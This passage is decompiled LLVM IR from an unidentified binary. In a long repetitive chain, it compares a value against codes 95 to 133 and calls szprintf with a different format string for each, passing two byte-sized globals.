  %v8_c0f8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b968.167 to i32), i32 %v4_c0f8, i32 %v6_c0f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0fc

dec_label_pc_c0fc:                                ; preds = %dec_label_pc_c0c8, %dec_label_pc_c0d4
  %v7_c100 = icmp eq i32 %v2_ab54, 95
  br i1 %v7_c100, label %dec_label_pc_c108, label %dec_label_pc_c130

dec_label_pc_c108:                                ; preds = %dec_label_pc_c0fc
  %v3_c114 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c120 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c12c = sext i8 %v3_c114 to i32
  %v6_c12c = sext i8 %v3_c120 to i32
  %v8_c12c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bc98.270 to i32), i32 %v4_c12c, i32 %v6_c12c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c130

dec_label_pc_c130:                                ; preds = %dec_label_pc_c0fc, %dec_label_pc_c108
  %v7_c134 = icmp eq i32 %v2_ab54, 96
  br i1 %v7_c134, label %dec_label_pc_c13c, label %dec_label_pc_c164

dec_label_pc_c13c:                                ; preds = %dec_label_pc_c130
  %v3_c148 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c154 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c160 = sext i8 %v3_c148 to i32
  %v6_c160 = sext i8 %v3_c154 to i32
  %v8_c160 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1b998.173 to i32), i32 %v4_c160, i32 %v6_c160, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c164

dec_label_pc_c164:                                ; preds = %dec_label_pc_c130, %dec_label_pc_c13c
  %v7_c168 = icmp eq i32 %v2_ab54, 97
  br i1 %v7_c168, label %dec_label_pc_c170, label %dec_label_pc_c198

dec_label_pc_c170:                                ; preds = %dec_label_pc_c164
  %v3_c17c = load i8, i8* @global_var_2687d.82, align 1
  %v3_c188 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c194 = sext i8 %v3_c17c to i32
  %v6_c194 = sext i8 %v3_c188 to i32
  %v8_c194 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bca8.272 to i32), i32 %v4_c194, i32 %v6_c194, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c164, %dec_label_pc_c170
  %v7_c19c = icmp eq i32 %v2_ab54, 98
  br i1 %v7_c19c, label %dec_label_pc_c1a4, label %dec_label_pc_c1cc

dec_label_pc_c1a4:                                ; preds = %dec_label_pc_c198
  %v3_c1b0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c1bc = load i8, i8* @global_var_2687e.83, align 1
  %v4_c1c8 = sext i8 %v3_c1b0 to i32
  %v6_c1c8 = sext i8 %v3_c1bc to i32
  %v8_c1c8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bcb8.274 to i32), i32 %v4_c1c8, i32 %v6_c1c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1cc

dec_label_pc_c1cc:                                ; preds = %dec_label_pc_c198, %dec_label_pc_c1a4
  %v7_c1d0 = icmp eq i32 %v2_ab54, 99
  br i1 %v7_c1d0, label %dec_label_pc_c1d8, label %dec_label_pc_c200

dec_label_pc_c1d8:                                ; preds = %dec_label_pc_c1cc
  %v3_c1e4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c1f0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c1fc = sext i8 %v3_c1e4 to i32
  %v6_c1fc = sext i8 %v3_c1f0 to i32
  %v8_c1fc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bcc8.276 to i32), i32 %v4_c1fc, i32 %v6_c1fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c200

dec_label_pc_c200:                                ; preds = %dec_label_pc_c1cc, %dec_label_pc_c1d8
  %v7_c204 = icmp eq i32 %v2_ab54, 100
  br i1 %v7_c204, label %dec_label_pc_c20c, label %dec_label_pc_c234

dec_label_pc_c20c:                                ; preds = %dec_label_pc_c200
  %v3_c218 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c224 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c230 = sext i8 %v3_c218 to i32
  %v6_c230 = sext i8 %v3_c224 to i32
  %v8_c230 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bcd8.278 to i32), i32 %v4_c230, i32 %v6_c230, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c234

dec_label_pc_c234:                                ; preds = %dec_label_pc_c200, %dec_label_pc_c20c
  %v7_c238 = icmp eq i32 %v2_ab54, 101
  br i1 %v7_c238, label %dec_label_pc_c240, label %dec_label_pc_c268

dec_label_pc_c240:                                ; preds = %dec_label_pc_c234
  %v3_c24c = load i8, i8* @global_var_2687d.82, align 1
  %v3_c258 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c264 = sext i8 %v3_c24c to i32
  %v6_c264 = sext i8 %v3_c258 to i32
  %v8_c264 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bce8.280 to i32), i32 %v4_c264, i32 %v6_c264, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c268

dec_label_pc_c268:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c240
  %v7_c26c = icmp eq i32 %v2_ab54, 102
  br i1 %v7_c26c, label %dec_label_pc_c274, label %dec_label_pc_c29c

dec_label_pc_c274:                                ; preds = %dec_label_pc_c268
  %v3_c280 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c28c = load i8, i8* @global_var_2687e.83, align 1
  %v4_c298 = sext i8 %v3_c280 to i32
  %v6_c298 = sext i8 %v3_c28c to i32
  %v8_c298 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1bcf8.282 to i32), i32 %v4_c298, i32 %v6_c298, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c29c

dec_label_pc_c29c:                                ; preds = %dec_label_pc_c268, %dec_label_pc_c274
  %v7_c2a0 = icmp eq i32 %v2_ab54, 103
  br i1 %v7_c2a0, label %dec_label_pc_c2a8, label %dec_label_pc_c2d0

dec_label_pc_c2a8:                                ; preds = %dec_label_pc_c29c
  %v3_c2b4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c2c0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c2cc = sext i8 %v3_c2b4 to i32
  %v6_c2cc = sext i8 %v3_c2c0 to i32
  %v8_c2cc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd04.284 to i32), i32 %v4_c2cc, i32 %v6_c2cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2d0

dec_label_pc_c2d0:                                ; preds = %dec_label_pc_c29c, %dec_label_pc_c2a8
  %v7_c2d4 = icmp eq i32 %v2_ab54, 104
  br i1 %v7_c2d4, label %dec_label_pc_c2dc, label %dec_label_pc_c304

dec_label_pc_c2dc:                                ; preds = %dec_label_pc_c2d0
  %v3_c2e8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c2f4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c300 = sext i8 %v3_c2e8 to i32
  %v6_c300 = sext i8 %v3_c2f4 to i32
  %v8_c300 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd14.286 to i32), i32 %v4_c300, i32 %v6_c300, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c304

dec_label_pc_c304:                                ; preds = %dec_label_pc_c2d0, %dec_label_pc_c2dc
  %v7_c308 = icmp eq i32 %v2_ab54, 105
  br i1 %v7_c308, label %dec_label_pc_c310, label %dec_label_pc_c338

dec_label_pc_c310:                                ; preds = %dec_label_pc_c304
  %v3_c31c = load i8, i8* @global_var_2687d.82, align 1
  %v3_c328 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c334 = sext i8 %v3_c31c to i32
  %v6_c334 = sext i8 %v3_c328 to i32
  %v8_c334 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd24.288 to i32), i32 %v4_c334, i32 %v6_c334, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c338

dec_label_pc_c338:                                ; preds = %dec_label_pc_c304, %dec_label_pc_c310
  %v7_c33c = icmp eq i32 %v2_ab54, 106
  br i1 %v7_c33c, label %dec_label_pc_c344, label %dec_label_pc_c36c

dec_label_pc_c344:                                ; preds = %dec_label_pc_c338
  %v3_c350 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c35c = load i8, i8* @global_var_2687e.83, align 1
  %v4_c368 = sext i8 %v3_c350 to i32
  %v6_c368 = sext i8 %v3_c35c to i32
  %v8_c368 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1bd34.290 to i32), i32 %v4_c368, i32 %v6_c368, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c36c

dec_label_pc_c36c:                                ; preds = %dec_label_pc_c338, %dec_label_pc_c344
  %v7_c370 = icmp eq i32 %v2_ab54, 107
  br i1 %v7_c370, label %dec_label_pc_c378, label %dec_label_pc_c3a0

dec_label_pc_c378:                                ; preds = %dec_label_pc_c36c
  %v3_c384 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c390 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c39c = sext i8 %v3_c384 to i32
  %v6_c39c = sext i8 %v3_c390 to i32
  %v8_c39c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd40.292 to i32), i32 %v4_c39c, i32 %v6_c39c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3a0

dec_label_pc_c3a0:                                ; preds = %dec_label_pc_c36c, %dec_label_pc_c378
  %v7_c3a4 = icmp eq i32 %v2_ab54, 108
  br i1 %v7_c3a4, label %dec_label_pc_c3ac, label %dec_label_pc_c3d4

dec_label_pc_c3ac:                                ; preds = %dec_label_pc_c3a0
  %v3_c3b8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c3c4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c3d0 = sext i8 %v3_c3b8 to i32
  %v6_c3d0 = sext i8 %v3_c3c4 to i32
  %v8_c3d0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bd50.294 to i32), i32 %v4_c3d0, i32 %v6_c3d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3d4

dec_label_pc_c3d4:                                ; preds = %dec_label_pc_c3a0, %dec_label_pc_c3ac
  %v7_c3d8 = icmp eq i32 %v2_ab54, 109
  br i1 %v7_c3d8, label %dec_label_pc_c3e0, label %dec_label_pc_c408

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c3d4
  %v3_c3ec = load i8, i8* @global_var_2687d.82, align 1
  %v3_c3f8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c404 = sext i8 %v3_c3ec to i32
  %v6_c404 = sext i8 %v3_c3f8 to i32
  %v8_c404 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bd60.296 to i32), i32 %v4_c404, i32 %v6_c404, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c408

dec_label_pc_c408:                                ; preds = %dec_label_pc_c3d4, %dec_label_pc_c3e0
  %v7_c40c = icmp eq i32 %v2_ab54, 110
  br i1 %v7_c40c, label %dec_label_pc_c414, label %dec_label_pc_c43c

dec_label_pc_c414:                                ; preds = %dec_label_pc_c408
  %v3_c420 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c42c = load i8, i8* @global_var_2687e.83, align 1
  %v4_c438 = sext i8 %v3_c420 to i32
  %v6_c438 = sext i8 %v3_c42c to i32
  %v8_c438 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bd70.298 to i32), i32 %v4_c438, i32 %v6_c438, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c43c

dec_label_pc_c43c:                                ; preds = %dec_label_pc_c408, %dec_label_pc_c414
  %v7_c440 = icmp eq i32 %v2_ab54, 111
  br i1 %v7_c440, label %dec_label_pc_c448, label %dec_label_pc_c470

dec_label_pc_c448:                                ; preds = %dec_label_pc_c43c
  %v3_c454 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c460 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c46c = sext i8 %v3_c454 to i32
  %v6_c46c = sext i8 %v3_c460 to i32
  %v8_c46c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bd80.300 to i32), i32 %v4_c46c, i32 %v6_c46c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c43c, %dec_label_pc_c448
  %v7_c474 = icmp eq i32 %v2_ab54, 112
  br i1 %v7_c474, label %dec_label_pc_c47c, label %dec_label_pc_c4a4

dec_label_pc_c47c:                                ; preds = %dec_label_pc_c470
  %v3_c488 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c494 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c4a0 = sext i8 %v3_c488 to i32
  %v6_c4a0 = sext i8 %v3_c494 to i32
  %v8_c4a0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bd90.302 to i32), i32 %v4_c4a0, i32 %v6_c4a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4a4

dec_label_pc_c4a4:                                ; preds = %dec_label_pc_c470, %dec_label_pc_c47c
  %v7_c4a8 = icmp eq i32 %v2_ab54, 113
  br i1 %v7_c4a8, label %dec_label_pc_c4b0, label %dec_label_pc_c4d8

dec_label_pc_c4b0:                                ; preds = %dec_label_pc_c4a4
  %v3_c4bc = load i8, i8* @global_var_2687d.82, align 1
  %v3_c4c8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c4d4 = sext i8 %v3_c4bc to i32
  %v6_c4d4 = sext i8 %v3_c4c8 to i32
  %v8_c4d4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bda0.304 to i32), i32 %v4_c4d4, i32 %v6_c4d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4d8

dec_label_pc_c4d8:                                ; preds = %dec_label_pc_c4a4, %dec_label_pc_c4b0
  %v7_c4dc = icmp eq i32 %v2_ab54, 114
  br i1 %v7_c4dc, label %dec_label_pc_c4e4, label %dec_label_pc_c50c

dec_label_pc_c4e4:                                ; preds = %dec_label_pc_c4d8
  %v3_c4f0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c4fc = load i8, i8* @global_var_2687e.83, align 1
  %v4_c508 = sext i8 %v3_c4f0 to i32
  %v6_c508 = sext i8 %v3_c4fc to i32
  %v8_c508 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bdb0.306 to i32), i32 %v4_c508, i32 %v6_c508, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c50c

dec_label_pc_c50c:                                ; preds = %dec_label_pc_c4d8, %dec_label_pc_c4e4
  %v7_c510 = icmp eq i32 %v2_ab54, 115
  br i1 %v7_c510, label %dec_label_pc_c518, label %dec_label_pc_c540

dec_label_pc_c518:                                ; preds = %dec_label_pc_c50c
  %v3_c524 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c530 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c53c = sext i8 %v3_c524 to i32
  %v6_c53c = sext i8 %v3_c530 to i32
  %v8_c53c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bdc0.308 to i32), i32 %v4_c53c, i32 %v6_c53c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c540

dec_label_pc_c540:                                ; preds = %dec_label_pc_c50c, %dec_label_pc_c518
  %v7_c544 = icmp eq i32 %v2_ab54, 116
  br i1 %v7_c544, label %dec_label_pc_c54c, label %dec_label_pc_c574

dec_label_pc_c54c:                                ; preds = %dec_label_pc_c540
  %v3_c558 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c564 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c570 = sext i8 %v3_c558 to i32
  %v6_c570 = sext i8 %v3_c564 to i32
  %v8_c570 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1bdd0.310 to i32), i32 %v4_c570, i32 %v6_c570, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c574

dec_label_pc_c574:                                ; preds = %dec_label_pc_c540, %dec_label_pc_c54c
  %v7_c578 = icmp eq i32 %v2_ab54, 117
  br i1 %v7_c578, label %dec_label_pc_c580, label %dec_label_pc_c5a8

dec_label_pc_c580:                                ; preds = %dec_label_pc_c574
  %v3_c58c = load i8, i8* @global_var_2687d.82, align 1
  %v3_c598 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c5a4 = sext i8 %v3_c58c to i32
  %v6_c5a4 = sext i8 %v3_c598 to i32
  %v8_c5a4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bde0.312 to i32), i32 %v4_c5a4, i32 %v6_c5a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5a8

dec_label_pc_c5a8:                                ; preds = %dec_label_pc_c574, %dec_label_pc_c580
  %v7_c5ac = icmp eq i32 %v2_ab54, 118
  br i1 %v7_c5ac, label %dec_label_pc_c5b4, label %dec_label_pc_c5dc

dec_label_pc_c5b4:                                ; preds = %dec_label_pc_c5a8
  %v3_c5c0 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c5cc = load i8, i8* @global_var_2687e.83, align 1
  %v4_c5d8 = sext i8 %v3_c5c0 to i32
  %v6_c5d8 = sext i8 %v3_c5cc to i32
  %v8_c5d8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bdf0.314 to i32), i32 %v4_c5d8, i32 %v6_c5d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5dc

dec_label_pc_c5dc:                                ; preds = %dec_label_pc_c5a8, %dec_label_pc_c5b4
  %v7_c5e0 = icmp eq i32 %v2_ab54, 119
  br i1 %v7_c5e0, label %dec_label_pc_c5e8, label %dec_label_pc_c610

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5dc
  %v3_c5f4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c600 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c60c = sext i8 %v3_c5f4 to i32
  %v6_c60c = sext i8 %v3_c600 to i32
  %v8_c60c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be00.316 to i32), i32 %v4_c60c, i32 %v6_c60c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c610

dec_label_pc_c610:                                ; preds = %dec_label_pc_c5dc, %dec_label_pc_c5e8
  %v7_c614 = icmp eq i32 %v2_ab54, 120
  br i1 %v7_c614, label %dec_label_pc_c61c, label %dec_label_pc_c644

dec_label_pc_c61c:                                ; preds = %dec_label_pc_c610
  %v3_c628 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c634 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c640 = sext i8 %v3_c628 to i32
  %v6_c640 = sext i8 %v3_c634 to i32
  %v8_c640 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be10.318 to i32), i32 %v4_c640, i32 %v6_c640, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c644

dec_label_pc_c644:                                ; preds = %dec_label_pc_c610, %dec_label_pc_c61c
  %v7_c648 = icmp eq i32 %v2_ab54, 121
  br i1 %v7_c648, label %dec_label_pc_c650, label %dec_label_pc_c678

dec_label_pc_c650:                                ; preds = %dec_label_pc_c644
  %v3_c65c = load i8, i8* @global_var_2687d.82, align 1
  %v3_c668 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c674 = sext i8 %v3_c65c to i32
  %v6_c674 = sext i8 %v3_c668 to i32
  %v8_c674 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1bd50.294 to i32), i32 %v4_c674, i32 %v6_c674, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c644, %dec_label_pc_c650
  %v7_c67c = icmp eq i32 %v2_ab54, 122
  br i1 %v7_c67c, label %dec_label_pc_c684, label %dec_label_pc_c6ac

dec_label_pc_c684:                                ; preds = %dec_label_pc_c678
  %v3_c690 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c69c = load i8, i8* @global_var_2687e.83, align 1
  %v4_c6a8 = sext i8 %v3_c690 to i32
  %v6_c6a8 = sext i8 %v3_c69c to i32
  %v8_c6a8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1be20.320 to i32), i32 %v4_c6a8, i32 %v6_c6a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6ac

dec_label_pc_c6ac:                                ; preds = %dec_label_pc_c678, %dec_label_pc_c684
  %v7_c6b0 = icmp eq i32 %v2_ab54, 123
  br i1 %v7_c6b0, label %dec_label_pc_c6b8, label %dec_label_pc_c6e0

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c6ac
  %v3_c6c4 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c6d0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c6dc = sext i8 %v3_c6c4 to i32
  %v6_c6dc = sext i8 %v3_c6d0 to i32
  %v8_c6dc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1be30.322 to i32), i32 %v4_c6dc, i32 %v6_c6dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6e0

dec_label_pc_c6e0:                                ; preds = %dec_label_pc_c6ac, %dec_label_pc_c6b8
  %v7_c6e4 = icmp eq i32 %v2_ab54, 124
  br i1 %v7_c6e4, label %dec_label_pc_c6ec, label %dec_label_pc_c714

dec_label_pc_c6ec:                                ; preds = %dec_label_pc_c6e0
  %v3_c6f8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c704 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c710 = sext i8 %v3_c6f8 to i32
  %v6_c710 = sext i8 %v3_c704 to i32
  %v8_c710 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be3c.324 to i32), i32 %v4_c710, i32 %v6_c710, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c6e0, %dec_label_pc_c6ec
  %v7_c718 = icmp eq i32 %v2_ab54, 125
  br i1 %v7_c718, label %dec_label_pc_c720, label %dec_label_pc_c748

dec_label_pc_c720:                                ; preds = %dec_label_pc_c714
  %v3_c72c = load i8, i8* @global_var_2687d.82, align 1
  %v3_c738 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c744 = sext i8 %v3_c72c to i32
  %v6_c744 = sext i8 %v3_c738 to i32
  %v8_c744 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be4c.326 to i32), i32 %v4_c744, i32 %v6_c744, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c748

dec_label_pc_c748:                                ; preds = %dec_label_pc_c714, %dec_label_pc_c720
  %v7_c74c = icmp eq i32 %v2_ab54, 126
  br i1 %v7_c74c, label %dec_label_pc_c754, label %dec_label_pc_c77c

dec_label_pc_c754:                                ; preds = %dec_label_pc_c748
  %v3_c760 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c76c = load i8, i8* @global_var_2687e.83, align 1
  %v4_c778 = sext i8 %v3_c760 to i32
  %v6_c778 = sext i8 %v3_c76c to i32
  %v8_c778 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be3c.324 to i32), i32 %v4_c778, i32 %v6_c778, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c77c

dec_label_pc_c77c:                                ; preds = %dec_label_pc_c748, %dec_label_pc_c754
  %v7_c780 = icmp eq i32 %v2_ab54, 127
  br i1 %v7_c780, label %dec_label_pc_c788, label %dec_label_pc_c7b0

dec_label_pc_c788:                                ; preds = %dec_label_pc_c77c
  %v3_c794 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c7a0 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c7ac = sext i8 %v3_c794 to i32
  %v6_c7ac = sext i8 %v3_c7a0 to i32
  %v8_c7ac = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be5c.328 to i32), i32 %v4_c7ac, i32 %v6_c7ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7b0

dec_label_pc_c7b0:                                ; preds = %dec_label_pc_c77c, %dec_label_pc_c788
  %v7_c7b4 = icmp eq i32 %v2_ab54, 128
  br i1 %v7_c7b4, label %dec_label_pc_c7bc, label %dec_label_pc_c7e4

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c7b0
  %v3_c7c8 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c7d4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c7e0 = sext i8 %v3_c7c8 to i32
  %v6_c7e0 = sext i8 %v3_c7d4 to i32
  %v8_c7e0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be6c.330 to i32), i32 %v4_c7e0, i32 %v6_c7e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7e4

dec_label_pc_c7e4:                                ; preds = %dec_label_pc_c7b0, %dec_label_pc_c7bc
  %v7_c7e8 = icmp eq i32 %v2_ab54, 129
  br i1 %v7_c7e8, label %dec_label_pc_c7f0, label %dec_label_pc_c818

dec_label_pc_c7f0:                                ; preds = %dec_label_pc_c7e4
  %v3_c7fc = load i8, i8* @global_var_2687d.82, align 1
  %v3_c808 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c814 = sext i8 %v3_c7fc to i32
  %v6_c814 = sext i8 %v3_c808 to i32
  %v8_c814 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be7c.332 to i32), i32 %v4_c814, i32 %v6_c814, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c818

dec_label_pc_c818:                                ; preds = %dec_label_pc_c7e4, %dec_label_pc_c7f0
  %v7_c81c = icmp eq i32 %v2_ab54, 130
  br i1 %v7_c81c, label %dec_label_pc_c824, label %dec_label_pc_c84c

dec_label_pc_c824:                                ; preds = %dec_label_pc_c818
  %v3_c830 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c83c = load i8, i8* @global_var_2687e.83, align 1
  %v4_c848 = sext i8 %v3_c830 to i32
  %v6_c848 = sext i8 %v3_c83c to i32
  %v8_c848 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be8c.334 to i32), i32 %v4_c848, i32 %v6_c848, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c84c

dec_label_pc_c84c:                                ; preds = %dec_label_pc_c818, %dec_label_pc_c824
  %v7_c850 = icmp eq i32 %v2_ab54, 131
  br i1 %v7_c850, label %dec_label_pc_c858, label %dec_label_pc_c880

dec_label_pc_c858:                                ; preds = %dec_label_pc_c84c
  %v3_c864 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c870 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c87c = sext i8 %v3_c864 to i32
  %v6_c87c = sext i8 %v3_c870 to i32
  %v8_c87c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1be9c.336 to i32), i32 %v4_c87c, i32 %v6_c87c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c880

dec_label_pc_c880:                                ; preds = %dec_label_pc_c84c, %dec_label_pc_c858
  %v7_c884 = icmp eq i32 %v2_ab54, 132
  br i1 %v7_c884, label %dec_label_pc_c88c, label %dec_label_pc_c8b4

dec_label_pc_c88c:                                ; preds = %dec_label_pc_c880
  %v3_c898 = load i8, i8* @global_var_2687d.82, align 1
  %v3_c8a4 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c8b0 = sext i8 %v3_c898 to i32
  %v6_c8b0 = sext i8 %v3_c8a4 to i32
  %v8_c8b0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1beac.338 to i32), i32 %v4_c8b0, i32 %v6_c8b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8b4

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c880, %dec_label_pc_c88c
  %v7_c8b8 = icmp eq i32 %v2_ab54, 133
  br i1 %v7_c8b8, label %dec_label_pc_c8c0, label %dec_label_pc_c8e8

dec_label_pc_c8c0:                                ; preds = %dec_label_pc_c8b4
  %v3_c8cc = load i8, i8* @global_var_2687d.82, align 1
  %v3_c8d8 = load i8, i8* @global_var_2687e.83, align 1
  %v4_c8e4 = sext i8 %v3_c8cc to i32
